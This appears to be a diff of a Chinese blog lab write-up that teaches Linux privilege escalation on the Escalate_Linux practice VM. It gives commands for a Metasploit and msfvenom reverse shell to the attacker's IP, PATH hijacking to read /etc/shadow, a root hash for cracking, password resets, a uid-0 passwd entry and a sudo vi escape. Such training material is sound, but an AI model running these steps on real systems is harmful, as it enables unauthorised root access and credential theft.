       <meta itemprop="description" content="潜心学习，不骄不躁">
     </span>
@@ -330,7 +330,7 @@
               </span>
               <span class="post-meta-item-text">分类于</span>
                 <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/wan1/categories/bachang/" itemprop="url" rel="index"><span itemprop="name">-bachang</span></a>
+                  <a href="/categories/bachang/" itemprop="url" rel="index"><span itemprop="name">-bachang</span></a>
                 </span>
             </span>
 
@@ -348,11 +348,11 @@
         <h1 id="利用Escalate-Linux靶机学习11种linux提权"><a href="#利用Escalate-Linux靶机学习11种linux提权" class="headerlink" title="利用Escalate_Linux靶机学习11种linux提权"></a>利用Escalate_Linux靶机学习11种linux提权</h1><p>搭建好之后，开始进行测试。</p>
 <p>首先开一下kali，对网段的靶机进行一个扫描，arp-scan -l</p>
 <p>发现主机</p>
-<p><img src="/wan1/wan1/2022/08/14/%E5%88%A9%E7%94%A8Escalate-Linux%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A011%E7%A7%8Dlinux%E6%8F%90%E6%9D%83/image-20220814122916292.png" alt="image-20220814122916292"></p>
+<p><img src="/2022/08/14/%E5%88%A9%E7%94%A8Escalate-Linux%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A011%E7%A7%8Dlinux%E6%8F%90%E6%9D%83/image-20220814122916292.png" alt="image-20220814122916292"></p>
 <p>做一个简单的外网打点，扫端口，扫目录，拿shell，进内网</p>
-<p><img src="/wan1/wan1/2022/08/14/%E5%88%A9%E7%94%A8Escalate-Linux%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A011%E7%A7%8Dlinux%E6%8F%90%E6%9D%83/image-20220814123432519.png" alt="image-20220814123432519"></p>
-<p><img src="/wan1/wan1/2022/08/14/%E5%88%A9%E7%94%A8Escalate-Linux%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A011%E7%A7%8Dlinux%E6%8F%90%E6%9D%83/image-20220814123600420.png" alt="image-20220814123600420"></p>
-<p><img src="/wan1/wan1/2022/08/14/%E5%88%A9%E7%94%A8Escalate-Linux%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A011%E7%A7%8Dlinux%E6%8F%90%E6%9D%83/image-20220814123612490.png" alt="image-20220814123612490"></p>
+<p><img src="/2022/08/14/%E5%88%A9%E7%94%A8Escalate-Linux%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A011%E7%A7%8Dlinux%E6%8F%90%E6%9D%83/image-20220814123432519.png" alt="image-20220814123432519"></p>
+<p><img src="/2022/08/14/%E5%88%A9%E7%94%A8Escalate-Linux%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A011%E7%A7%8Dlinux%E6%8F%90%E6%9D%83/image-20220814123600420.png" alt="image-20220814123600420"></p>
+<p><img src="/2022/08/14/%E5%88%A9%E7%94%A8Escalate-Linux%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A011%E7%A7%8Dlinux%E6%8F%90%E6%9D%83/image-20220814123612490.png" alt="image-20220814123612490"></p>
 <p>就直接给了个webshell</p>
 <p>那现在就是拿主机的meterprete</p>
 <p>使用msf进行攻击：</p>
@@ -362,40 +362,40 @@
 <p>设置服务端和本地地址都为攻击机ip，运行如下：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">set srvhost 192.168.52.129</span><br><span class="line">set lhost 192.168.52.129</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
-<p><img src="/wan1/wan1/2022/08/14/%E5%88%A9%E7%94%A8Escalate-Linux%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A011%E7%A7%8Dlinux%E6%8F%90%E6%9D%83/image-20220814135753234.png" alt="image-20220814135753234"></p>
+<p><img src="/2022/08/14/%E5%88%A9%E7%94%A8Escalate-Linux%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A011%E7%A7%8Dlinux%E6%8F%90%E6%9D%83/image-20220814135753234.png" alt="image-20220814135753234"></p>
 <p>把给出的代码放到靶机执行（记得要url编码一下</p>
 <p>这样就拿到了一个meterpreter</p>
-<p><img src="/wan1/wan1/2022/08/14/%E5%88%A9%E7%94%A8Escalate-Linux%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A011%E7%A7%8Dlinux%E6%8F%90%E6%9D%83/image-20220814140443723.png" alt="image-20220814140443723"></p>
+<p><img src="/2022/08/14/%E5%88%A9%E7%94%A8Escalate-Linux%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A011%E7%A7%8Dlinux%E6%8F%90%E6%9D%83/image-20220814140443723.png" alt="image-20220814140443723"></p>
 <p>进入shell环境</p>
-<p><img src="/wan1/wan1/2022/08/14/%E5%88%A9%E7%94%A8Escalate-Linux%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A011%E7%A7%8Dlinux%E6%8F%90%E6%9D%83/image-20220814140534255.png" alt="image-20220814140534255"></p>
+<p><img src="/2022/08/14/%E5%88%A9%E7%94%A8Escalate-Linux%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A011%E7%A7%8Dlinux%E6%8F%90%E6%9D%83/image-20220814140534255.png" alt="image-20220814140534255"></p>
 <h1 id="提权方式1：SUID提权"><a href="#提权方式1：SUID提权" class="headerlink" title="提权方式1：SUID提权"></a>提权方式1：SUID提权</h1><p><a target="_blank" rel="noopener" href="https://www.freesion.com/article/5522129624/">靶机、软件搭建:13—LinEnum.sh（本地Linux枚举和提权辅助脚本） - 灰信网（软件开发博客聚合） (freesion.com)</a></p>
 <p>这里使用的是LinEnum.sh工具，下来我也会总结一个文章。</p>
 <p>注：要进入tmp目录下继续wget，主要是因为tmp目录权限大。并且要先在kali上开启http.server的服务。</p>
-<p><img src="/wan1/wan1/2022/08/14/%E5%88%A9%E7%94%A8Escalate-Linux%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A011%E7%A7%8Dlinux%E6%8F%90%E6%9D%83/image-20220814141703512.png" alt="image-20220814141703512"></p>
+<p><img src="/2022/08/14/%E5%88%A9%E7%94%A8Escalate-Linux%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A011%E7%A7%8Dlinux%E6%8F%90%E6%9D%83/image-20220814141703512.png" alt="image-20220814141703512"></p>
 <p>先修改一下权限，然后执行脚本</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chmod 777 LinEnum.sh</span><br><span class="line">./LinEnum.sh |more</span><br></pre></td></tr></table></figure>
 
 <p>这个脚本会枚举出我们当前的一个linux环境的一些信息啊之类的东西。</p>
 <p>使用以下命令找一下具有suid权限的程序</p>
 <p><code>find / -perm -u=s -type f 2&gt;/dev/null</code></p>
-<p><img src="/wan1/wan1/2022/08/14/%E5%88%A9%E7%94%A8Escalate-Linux%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A011%E7%A7%8Dlinux%E6%8F%90%E6%9D%83/image-20220814145141549.png" alt="image-20220814145141549"></p>
+<p><img src="/2022/08/14/%E5%88%A9%E7%94%A8Escalate-Linux%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A011%E7%A7%8Dlinux%E6%8F%90%E6%9D%83/image-20220814145141549.png" alt="image-20220814145141549"></p>
 <p>tips：上一步中，如果要直接显示文件的权限，可以使用以下命令</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -user root -perm -4000 -type f 2&gt;/dev/null -exec ls -l &#123;&#125; \;</span><br></pre></td></tr></table></figure>
 
 <p>进入目录，直接执行，拿到权限</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd /home/user3</span><br><span class="line">./shell</span><br></pre></td></tr></table></figure>
 
-<p><img src="/wan1/wan1/2022/08/14/%E5%88%A9%E7%94%A8Escalate-Linux%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A011%E7%A7%8Dlinux%E6%8F%90%E6%9D%83/image-20220814145618134.png" alt="image-20220814145618134"></p>
+<p><img src="/2022/08/14/%E5%88%A9%E7%94%A8Escalate-Linux%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A011%E7%A7%8Dlinux%E6%8F%90%E6%9D%83/image-20220814145618134.png" alt="image-20220814145618134"></p>
 <h1 id="提权方式2：环境变量劫持提权"><a href="#提权方式2：环境变量劫持提权" class="headerlink" title="提权方式2：环境变量劫持提权"></a>提权方式2：环境变量劫持提权</h1><p>简单来说就是SUID文件的权限高，而它去调用其他命令时，我们劫持了这个命令，并且这个命令的内容是/bin/bash，这样就相当于使用root权限运行了命令，拿到了高权限的shell。</p>
 <p>首先是在user5的用户下面发现了SUID文件，执行这个SUID文件，发现其命令类似于ls命令，那好了，我们也创建一个ls命令，但是这个ls执行的内容是/bin/bash，从而我们拿到了高权限的shell。</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">cd /home/user5</span><br><span class="line">ls</span><br><span class="line">./script</span><br><span class="line">echo $PATH</span><br><span class="line">cd ../../../../../../</span><br><span class="line">echo &quot;/bin/bash&quot; &gt; tmp/ls</span><br><span class="line">export PATH=/tmp:$PATH </span><br><span class="line">echo $PATH  </span><br><span class="line">chmod 755 /tmp/ls</span><br><span class="line">./script</span><br></pre></td></tr></table></figure>
 
-<p><img src="/wan1/wan1/2022/08/14/%E5%88%A9%E7%94%A8Escalate-Linux%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A011%E7%A7%8Dlinux%E6%8F%90%E6%9D%83/image-20220814151438796.png" alt="image-20220814151438796"></p>
+<p><img src="/2022/08/14/%E5%88%A9%E7%94%A8Escalate-Linux%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A011%E7%A7%8Dlinux%E6%8F%90%E6%9D%83/image-20220814151438796.png" alt="image-20220814151438796"></p>
 <h1 id="提权方式3：破解-etc-shadow文件提权"><a href="#提权方式3：破解-etc-shadow文件提权" class="headerlink" title="提权方式3：破解/etc/shadow文件提权"></a>提权方式3：破解/etc/shadow文件提权</h1><p>这种方式实际上就是爆破root用户的密码</p>
 <p>通过前面可知，我们能够通过命令劫持来拿到最高权限，那么我们也可以劫持命令，去读取/etc/shadow文件。</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">echo &#x27;cat /etc/shadow&#x27; &gt;/tmp/ls</span><br><span class="line">./script</span><br></pre></td></tr></table></figure>
 
-<p><img src="/wan1/wan1/2022/08/14/%E5%88%A9%E7%94%A8Escalate-Linux%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A011%E7%A7%8Dlinux%E6%8F%90%E6%9D%83/image-20220814153305096.png" alt="image-20220814153305096"></p>
+<p><img src="/2022/08/14/%E5%88%A9%E7%94%A8Escalate-Linux%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A011%E7%A7%8Dlinux%E6%8F%90%E6%9D%83/image-20220814153305096.png" alt="image-20220814153305096"></p>
 <p>接着复制root用户的账户和密码，并且保存为hash.txt</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &#x27;root:$6$mqjgcFoM$X/qNpZR6gXPAxdgDjFpaD1yPIqUF5l5ZDANRTKyvcHQwSqSxX5lA7n22kjEkQhSP6Uq7cPaYfzPSmgATM9cwD1&#x27; &gt; hash.txt</span><br></pre></td></tr></table></figure>
 
@@ -406,16 +406,16 @@
 <h1 id="提权方式4：修改sudoers文件中的用户密码提权"><a href="#提权方式4：修改sudoers文件中的用户密码提权" class="headerlink" title="提权方式4：修改sudoers文件中的用户密码提权"></a>提权方式4：修改sudoers文件中的用户密码提权</h1><p>还是使用前面的SUID文件，读取/etc/sudoers文件</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">echo &#x27;cat /etc/sudoers&#x27; &gt; /tmp/ls</span><br><span class="line">./script</span><br></pre></td></tr></table></figure>
 
-<p><img src="/wan1/wan1/2022/08/14/%E5%88%A9%E7%94%A8Escalate-Linux%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A011%E7%A7%8Dlinux%E6%8F%90%E6%9D%83/image-20220814160746738.png" alt="image-20220814160746738"></p>
+<p><img src="/2022/08/14/%E5%88%A9%E7%94%A8Escalate-Linux%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A011%E7%A7%8Dlinux%E6%8F%90%E6%9D%83/image-20220814160746738.png" alt="image-20220814160746738"></p>
 <p>改user1的密码</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">echo &#x27;echo &quot;user1:pi1grim&quot; | chpasswd&#x27; &gt;/tmp/ls</span><br><span class="line">./script</span><br><span class="line">su user1</span><br></pre></td></tr></table></figure>
 
-<p><img src="/wan1/wan1/2022/08/14/%E5%88%A9%E7%94%A8Escalate-Linux%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A011%E7%A7%8Dlinux%E6%8F%90%E6%9D%83/image-20220814160808281.png" alt="image-20220814160808281"></p>
+<p><img src="/2022/08/14/%E5%88%A9%E7%94%A8Escalate-Linux%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A011%E7%A7%8Dlinux%E6%8F%90%E6%9D%83/image-20220814160808281.png" alt="image-20220814160808281"></p>
 <h1 id="提权方式5：使用计划任务提权crontab"><a href="#提权方式5：使用计划任务提权crontab" class="headerlink" title="提权方式5：使用计划任务提权crontab"></a>提权方式5：使用计划任务提权crontab</h1><p>计划任务就是定时任务，一般运维会采用脚本去定时执行，但是如果权限配置不当的话，就会存在一些问题。<br>在开始介绍提权方式之前，先介绍下crontab，crontab是linux的计划任务，启动后的服务时crond，配置文件为/etc/crontab，可以通过配置文件定期执行程序或者命令。或者直接使用crontab命令也可以。</p>
 <p>首先我们看一下crontab的配置文件</p>
-<p><img src="/wan1/wan1/2022/08/14/%E5%88%A9%E7%94%A8Escalate-Linux%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A011%E7%A7%8Dlinux%E6%8F%90%E6%9D%83/image-20220814161022978.png" alt="image-20220814161022978"></p>
+<p><img src="/2022/08/14/%E5%88%A9%E7%94%A8Escalate-Linux%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A011%E7%A7%8Dlinux%E6%8F%90%E6%9D%83/image-20220814161022978.png" alt="image-20220814161022978"></p>
 <p>发现有一个每五分钟以root权限执行一次的文件是在user4的目录下面，所以我们需要user4的权限，因此我们可以通过第四种提权方式，先修改一下user的密码，登录user4。</p>
-<p><img src="/wan1/wan1/2022/08/14/%E5%88%A9%E7%94%A8Escalate-Linux%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A011%E7%A7%8Dlinux%E6%8F%90%E6%9D%83/image-20220814174709181.png" alt="image-20220814174709181"></p>
+<p><img src="/2022/08/14/%E5%88%A9%E7%94%A8Escalate-Linux%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A011%E7%A7%8Dlinux%E6%8F%90%E6%9D%83/image-20220814174709181.png" alt="image-20220814174709181"></p>
 <p>此时我们具备了编辑定时任务的权限。一个简单而且直接的办法是使用nc直接反弹shell至本机，但是经过测试后发现不行。用msf反弹shell</p>
 <p>msfvenom生成的反弹shell可以。</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p cmd/unix/reverse_netcat lhost=192.168.52.129 lport=8888</span><br></pre></td></tr></table></figure>
@@ -431,25 +431,25 @@
 
 <p>他奶奶的，结果路径搞错了，我等了半天没上线，cs也试了一下，我还以为是我的问题。</p>
 <p>终于上线了，等我我好辛苦</p>
-<p><img src="/wan1/wan1/2022/08/14/%E5%88%A9%E7%94%A8Escalate-Linux%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A011%E7%A7%8Dlinux%E6%8F%90%E6%9D%83/image-20220814184036930.png" alt="image-20220814184036930"></p>
+<p><img src="/2022/08/14/%E5%88%A9%E7%94%A8Escalate-Linux%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A011%E7%A7%8Dlinux%E6%8F%90%E6%9D%83/image-20220814184036930.png" alt="image-20220814184036930"></p>
 <h1 id="提权方式6：利用sudo提权"><a href="#提权方式6：利用sudo提权" class="headerlink" title="提权方式6：利用sudo提权"></a>提权方式6：利用sudo提权</h1><p>查看sudoers文件信息</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">echo &#x27;cat /etc/sudoers&#x27; &gt;/tmp/ls</span><br><span class="line">chmod +x /tmp/ls</span><br><span class="line">export PATH=/tmp:$PATH</span><br><span class="line">/home/user5/script</span><br></pre></td></tr></table></figure>
 
-<p><img src="/wan1/wan1/2022/08/14/%E5%88%A9%E7%94%A8Escalate-Linux%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A011%E7%A7%8Dlinux%E6%8F%90%E6%9D%83/image-20220814204440028.png" alt="image-20220814204440028"></p>
+<p><img src="/2022/08/14/%E5%88%A9%E7%94%A8Escalate-Linux%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A011%E7%A7%8Dlinux%E6%8F%90%E6%9D%83/image-20220814204440028.png" alt="image-20220814204440028"></p>
 <p>注意看sudoers文件中的user8用户，其可以通过root身份运行vi。这给提权创造了空间。为什么呢？因为vi存在交互模式，即可以在vi中运行命令。<br>在提权之前，我们要先进入user8用户</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">echo &#x27;echo &quot;user8:654321&quot; | chpasswd&#x27; &gt;/tmp/ls</span><br><span class="line">/home/user5/script</span><br><span class="line">su user8</span><br></pre></td></tr></table></figure>
 
 <p>查看一下授权列表</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -l</span><br></pre></td></tr></table></figure>
 
-<p><img src="/wan1/wan1/2022/08/14/%E5%88%A9%E7%94%A8Escalate-Linux%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A011%E7%A7%8Dlinux%E6%8F%90%E6%9D%83/image-20220814204706956.png" alt="image-20220814204706956"></p>
+<p><img src="/2022/08/14/%E5%88%A9%E7%94%A8Escalate-Linux%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A011%E7%A7%8Dlinux%E6%8F%90%E6%9D%83/image-20220814204706956.png" alt="image-20220814204706956"></p>
 <p>打开vi，使用sudo的原因就是用root权限来执行</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo vi   </span><br></pre></td></tr></table></figure>
 
 <p>在vi中输入以下命令，成功获取root权限的终端</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">:!/bin/bash</span><br></pre></td></tr></table></figure>
 
-<p><img src="/wan1/wan1/2022/08/14/%E5%88%A9%E7%94%A8Escalate-Linux%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A011%E7%A7%8Dlinux%E6%8F%90%E6%9D%83/image-20220814205424020.png" alt="image-20220814205424020"></p>
+<p><img src="/2022/08/14/%E5%88%A9%E7%94%A8Escalate-Linux%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A011%E7%A7%8Dlinux%E6%8F%90%E6%9D%83/image-20220814205424020.png" alt="image-20220814205424020"></p>
 <p>注意：在拿到root权限后，想要退出当前终端可以使用exit命令退出，会重新回到vi界面中去，回到vi界面后，重新按照vi命令退出即可。</p>
 <p>tips：上述演示是通过vi来获取root权限，其他要注意的命令包含find，less，more，git等等，在使用visudoers配置后，都会被利用来提权，比如使用</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls /etc | sudo more</span><br></pre></td></tr></table></figure>
@@ -459,12 +459,12 @@
 
 <p>也一样可以拿到root权限</p>
 <p>如下这个例子是当find被授权后，利用find提权，在找到f1文件后，执行shell。</p>
-<p><img src="/wan1/wan1/2022/08/14/%E5%88%A9%E7%94%A8Escalate-Linux%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A011%E7%A7%8Dlinux%E6%8F%90%E6%9D%83/63be551d50e942f1ac9a88ab9baaa219.png" alt="在这里插入图片描述"></p>
+<p><img src="/2022/08/14/%E5%88%A9%E7%94%A8Escalate-Linux%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A011%E7%A7%8Dlinux%E6%8F%90%E6%9D%83/63be551d50e942f1ac9a88ab9baaa219.png" alt="在这里插入图片描述"></p>
 <h1 id="提权方式7：利用超级用户提权"><a href="#提权方式7：利用超级用户提权" class="headerlink" title="提权方式7：利用超级用户提权"></a>提权方式7：利用超级用户提权</h1><p>还是在user6账户下，通过读取sudoers文件来查看用户权限情况</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">echo &#x27;cat /etc/sudoers&#x27; &gt;/tmp/ls</span><br><span class="line">chmod +x /tmp/ls</span><br><span class="line">export PATH=/tmp:$PATH</span><br><span class="line">/home/user5/script</span><br></pre></td></tr></table></figure>
 
 <p>发现其中的user2有user1用户的权限，而user1又是root用户的权限，好了，这下也可以提权</p>
-<p><img src="/wan1/wan1/2022/08/14/%E5%88%A9%E7%94%A8Escalate-Linux%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A011%E7%A7%8Dlinux%E6%8F%90%E6%9D%83/image-20220814205914830.png" alt="image-20220814205914830"></p>
+<p><img src="/2022/08/14/%E5%88%A9%E7%94%A8Escalate-Linux%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A011%E7%A7%8Dlinux%E6%8F%90%E6%9D%83/image-20220814205914830.png" alt="image-20220814205914830"></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">echo &#x27;echo &quot;user1:654321&quot; | chpasswd&#x27; &gt;/tmp/ls </span><br><span class="line">/home/user5/script</span><br><span class="line">echo &#x27;echo &quot;user2:654321&quot; | chpasswd&#x27; &gt;/tmp/ls</span><br><span class="line">/home/user5/script </span><br><span class="line">su user2</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
 <p>但是为什么不直接登录user1捏</p>
@@ -472,9 +472,9 @@
 <h1 id="提权方式8：利用-etc-passwd具有写入权限进行提权"><a href="#提权方式8：利用-etc-passwd具有写入权限进行提权" class="headerlink" title="提权方式8：利用/etc/passwd具有写入权限进行提权"></a>提权方式8：利用/etc/passwd具有写入权限进行提权</h1><p>思路：写入一个超级用户（uid为0的用户）进行提权<br>首先查看passwd文件的权限，发现属组对passwd文件有读写权限，这是不正确的配置。</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/bin/ls -l /etc/passwd</span><br></pre></td></tr></table></figure>
 
-<p><img src="/wan1/wan1/2022/08/14/%E5%88%A9%E7%94%A8Escalate-Linux%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A011%E7%A7%8Dlinux%E6%8F%90%E6%9D%83/image-20220814213927506.png" alt="image-20220814213927506"></p>
+<p><img src="/2022/08/14/%E5%88%A9%E7%94%A8Escalate-Linux%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A011%E7%A7%8Dlinux%E6%8F%90%E6%9D%83/image-20220814213927506.png" alt="image-20220814213927506"></p>
 <p>查看passwd文件发现user7属于root组</p>
-<p><img src="/wan1/wan1/2022/08/14/%E5%88%A9%E7%94%A8Escalate-Linux%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A011%E7%A7%8Dlinux%E6%8F%90%E6%9D%83/image-20220814214125378.png" alt="image-20220814214125378"></p>
+<p><img src="/2022/08/14/%E5%88%A9%E7%94%A8Escalate-Linux%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A011%E7%A7%8Dlinux%E6%8F%90%E6%9D%83/image-20220814214125378.png" alt="image-20220814214125378"></p>
 <p>我们可以编辑passwd文件，而passwd文件可以添加用户，那么我们就可以生成信息，然后添加到passwd文件中即可。</p>
 <p>但是首先要拿到user7的权限，所以也和上面的那些差不多，先拿到其权限</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">echo &#x27;echo &quot;user7:654321&quot; | chpasswd&#x27; &gt;/tmp/ls </span><br><span class="line">/home/user5/script</span><br><span class="line">su user7</span><br></pre></td></tr></table></figure>
@@ -488,7 +488,7 @@
 <p>但是其实不可以，因为不可以存储明文的密码，需要使用openssl来生成。</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl passwd -1 -salt test 654321</span><br></pre></td></tr></table></figure>
 
-<p><img src="/wan1/wan1/2022/08/14/%E5%88%A9%E7%94%A8Escalate-Linux%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A011%E7%A7%8Dlinux%E6%8F%90%E6%9D%83/image-20220814220231794.png" alt="image-20220814220231794"></p>
+<p><img src="/2022/08/14/%E5%88%A9%E7%94%A8Escalate-Linux%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A011%E7%A7%8Dlinux%E6%8F%90%E6%9D%83/image-20220814220231794.png" alt="image-20220814220231794"></p>
 <p>组装成passwd文件的样子</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">test:$1$VuLBG8GhqSK7eNFE4MsN10:0:0:root/root:/bin/bash</span><br></pre></td></tr></table></figure>
 
@@ -497,31 +497,31 @@
 
 <p>登录test用户，获取root权限</p>
 <p>test1:$1$test1$hGmveLQlOJfc5teE6BtC5.:0:0:root/root:/bin/bash</p>
-<p><img src="/wan1/wan1/2022/08/14/%E5%88%A9%E7%94%A8Escalate-Linux%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A011%E7%A7%8Dlinux%E6%8F%90%E6%9D%83/image-20220814221003363.png" alt="image-20220814221003363"></p>
+<p><img src="/2022/08/14/%E5%88%A9%E7%94%A8Escalate-Linux%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A011%E7%A7%8Dlinux%E6%8F%90%E6%9D%83/image-20220814221003363.png" alt="image-20220814221003363"></p>
 <p>(密码写错了再加了个用户)</p>
 <h1 id="提权方式9：利用mysql提权"><a href="#提权方式9：利用mysql提权" class="headerlink" title="提权方式9：利用mysql提权"></a>提权方式9：利用mysql提权</h1><p>通过查看本地开放的端口，发现存在一个mysql的服务</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netstat -tnlp</span><br></pre></td></tr></table></figure>
 
-<p><img src="/wan1/wan1/2022/08/14/%E5%88%A9%E7%94%A8Escalate-Linux%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A011%E7%A7%8Dlinux%E6%8F%90%E6%9D%83/image-20220814222402835.png" alt="image-20220814222402835"></p>
+<p><img src="/2022/08/14/%E5%88%A9%E7%94%A8Escalate-Linux%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A011%E7%A7%8Dlinux%E6%8F%90%E6%9D%83/image-20220814222402835.png" alt="image-20220814222402835"></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql -uroot -p</span><br></pre></td></tr></table></figure>
 
 <p>尝试连接，发现存在root弱口令</p>
 <p>为什么我这里没有数据库啊</p>
-<p><img src="/wan1/wan1/2022/08/14/%E5%88%A9%E7%94%A8Escalate-Linux%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A011%E7%A7%8Dlinux%E6%8F%90%E6%9D%83/image-20220814222919719.png" alt="image-20220814222919719"></p>
+<p><img src="/2022/08/14/%E5%88%A9%E7%94%A8Escalate-Linux%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A011%E7%A7%8Dlinux%E6%8F%90%E6%9D%83/image-20220814222919719.png" alt="image-20220814222919719"></p>
 <p>反正大概思路就是在数据库里面找到了一个mysql账号的密码，而这台机器上面使用<code>id mysql</code>可以发现也有一个叫这个的用户，所以登录他。登录进去之后会发现一个存有root用户的敏感文件。</p>
